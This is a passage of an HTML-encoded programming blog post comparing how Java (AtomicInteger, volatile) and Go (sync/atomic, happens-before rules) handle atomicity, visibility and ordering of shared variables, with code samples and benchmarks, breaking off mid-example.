      "content_html": "<!-- summary -->\n<p>When writing concurrency code, we often use mechanisms like Lock or Synchronized to protect share resources (sometimes itâ€™s a piece of code). What if we merely want to protect one variable but not a whole code? Itâ€™s too expensive to use Lock or Synchronized to protect just one variable.</p>\n<!-- summary -->\n<p>Letâ€™s see one simple Golang code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkLocke</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><br>\t\t<span class=\"token keyword\">var</span> l sync<span class=\"token punctuation\">.</span>Mutex<br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t\ta<span class=\"token operator\">++</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>And profiling of the code will tell you how expensive Lock cost, as shown below:</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/lock-profiling.png\" alt=\"\"></p>\n<p>You can see that lots of CPU time were wasted in Lock.</p>\n<p>To improve performance, often we would not use lock if we just want to protect one variable instead of the piece of code.</p>\n<p>In this article, I will introduce how to protect these share variables in Java and Golang.</p>\n<p>In the very beginning, three things need to care: <strong>atomicity</strong>, <strong>visibility</strong>, and <strong>ordering</strong>. Itâ€™s too hard to understand from words, so letâ€™s see examples directly.</p>\n<h1 id=\"atomicity\"><a class=\"direct-link\" href=\"#atomicity\">#</a> Atomicity</h1>\n<p>The action to access shared variable must be executed all in once and indivisibly. A line of code may be composed of several cpu instructions, like the codei++ is composed of 3 cpu instructions: <code>read value</code>, <code>add 1 to value</code> and <code>save value</code>. If two threads run i++ simultaneously, all these cpu instructions may be executed interleaved:</p>\n<pre class=\"language-text\"><code class=\"language-text\">thread1 load value 100  <br>thread2 load value 100  <br>thread1 add 1 to value 101  <br>thread2 add 1 to value 101  <br>thread1 save value 101  <br>thread2 save value 101</code></pre>\n<p>Finally, we get a wrong answer: i = 101, which is not correct.<br>\nLetâ€™s look at a simple Java exampleÂ :</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Atomic</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                counter<span class=\"token punctuation\">.</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Line 16 should print 100000, but the value printed is always less than 100000. Thatâ€™s why we must care about atomicity.</p>\n<h1 id=\"visibility\"><a class=\"direct-link\" href=\"#visibility\">#</a> Visibility</h1>\n<p>In Multicore architecture, every CPU has its cache. Thus CPU can load value from cache, which is faster than loading value from main memory. The architecture looks like below:</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/cpu-architecture.png\" alt=\"\"></p>\n<p>So itâ€™s clear that the value of a variable may exist in multi CPUâ€™s cache. If cpu1 changes the value of one variable but cpu2 did not aware of that, cpu2 may use the old value until cpu2 reload the value from main memory.</p>\n<p>Here is simple Java code to show the problem:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">boolean</span> bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Even thread t2 had changed the flag to true in line 12, thread t1 would still live in an infinite loop in line 4~6. Thatâ€™s because t1 does not see a new value of the flag.</p>\n<h1 id=\"ordering\"><a class=\"direct-link\" href=\"#ordering\">#</a> Ordering</h1>\n<p>Sometimes the compile would reordering instructions due to the purpose of optimizations. As a result, the ordering of instructions running in your machine may not as your imagination. See these three codes:</p>\n<pre class=\"language-text\"><code class=\"language-text\">a = 1  <br>b = 2  <br>c = a + b</code></pre>\n<p>line 3 is a dependency on line1 &amp; line2, so the real ordering of instructions may like below:</p>\n<pre class=\"language-text\"><code class=\"language-text\">b = 2  <br>a = 1  <br>c = a + b</code></pre>\n<p>Itâ€™s ok when your code is running on a single thread. But when running on multi-thread, the reordering may cause some bug you can not understand. Take the code for example:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Non thread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>In the writing order, we assign a=2 first and then b=1, so it should never happen that the code runs the block behind the if condition in line 12. But itâ€™s possible. Although itâ€™s very rare to happen, it DO happen.</p>\n<p>Note that visibility and ordering are often seen together as the problem of <a href=\"https://en.wikipedia.org/wiki/Happened-before\">happen-before</a>.</p>\n<p>Itâ€™s common that implementing singleton pattern with double-checked locking to improve performance. If you were not aware of happen-before, it may cause some issue: even if the singleton instance is not null, that does not mean that system had finished constructed the singleton instance. You can see more detail in this <a href=\"https://en.wikipedia.org/wiki/Double-checked_locking\">wiki</a>.</p>\n<p>So letâ€™s see how Java and Golang solve these issues.</p>\n<h1 id=\"java\"><a class=\"direct-link\" href=\"#java\">#</a> Java</h1>\n<h2 id=\"how-java-solve-atomicity\"><a class=\"direct-link\" href=\"#how-java-solve-atomicity\">#</a> How Java solve Atomicity</h2>\n<p>Java provides <strong>package java.util.concurrent.atomic</strong> to guarantee the atomicity when accessing a shared variable. For example, we could use <strong>AtomicInteger</strong> to fix the first example in the beginning like below:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">incrementAndGet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">AtomicInteger</span> i <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AtomicInteger</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h2 id=\"how-java-solve-happen-before\"><a class=\"direct-link\" href=\"#how-java-solve-happen-before\">#</a> How Java solve happen-before</h2>\n<p>Java uses keyword <strong>volatile</strong> to ensure happen-before. Once you declare a variable with volatile, then happen-before is guaranteed in that variable.</p>\n<p>Letâ€™s look at the secondary example in the beginning, I use volatile to declare the variable as below:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">boolean</span>  bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Now when thread t2 updates bool variable in Flag, thread t1 would be aware of that and escape from the for loop.</p>\n<p>Then the third example. After I declare variables a and b with volatile, Compiler would make sure that a=2 happen before b=1, so it would guarantee that the program never enters if statement.</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Nonthread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h1 id=\"golang\"><a class=\"direct-link\" href=\"#golang\">#</a> Golang</h1>\n<h2 id=\"how-golang-solve-atomicity\"><a class=\"direct-link\" href=\"#how-golang-solve-atomicity\">#</a> How Golang solve Atomicity</h2>\n<p>Golang provides its atomicity tool kit, too.</p>\n<p>Do you remember the Golangâ€™s Lock example at the beginning of the article? We can use atomic instead of Lock:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkFib10</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token function\">int64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tatomic<span class=\"token punctuation\">.</span><span class=\"token function\">AddInt64</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>If you run benchmark, you would figure out the performance gap between Lock and atomicity:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">BenchmarkLock-8 <span class=\"token number\">9266</span> <span class=\"token number\">134075</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op  <br>BenchmarkAtomic-8 <span class=\"token number\">19225</span> <span class=\"token number\">62309</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op</code></pre>\n<p>And below is the profiling of atomicity:</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/atomic-profiling.png\" alt=\"\"></p>\n<h2 id=\"how-golang-solve-happen-before%3F\"><a class=\"direct-link\" href=\"#how-golang-solve-happen-before%3F\">#</a> How Golang solve happen-before?</h2>\n<p>According to Golangâ€™s official blog, Golang would guarantee happen-before in these conditions:</p>\n<ul>\n<li>Initialization</li>\n<li>Goroutine creation</li>\n<li>Goroutine destruction</li>\n<li>Channel communication</li>\n<li>Locks</li>\n<li>Once</li>\n</ul>\n<p>But Golang does not provide something like volatile in Java to protect one variable share between goroutines. In terms of visibility, Such as below code may be incorrect synchronization:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">continue</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Never end\\n\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token 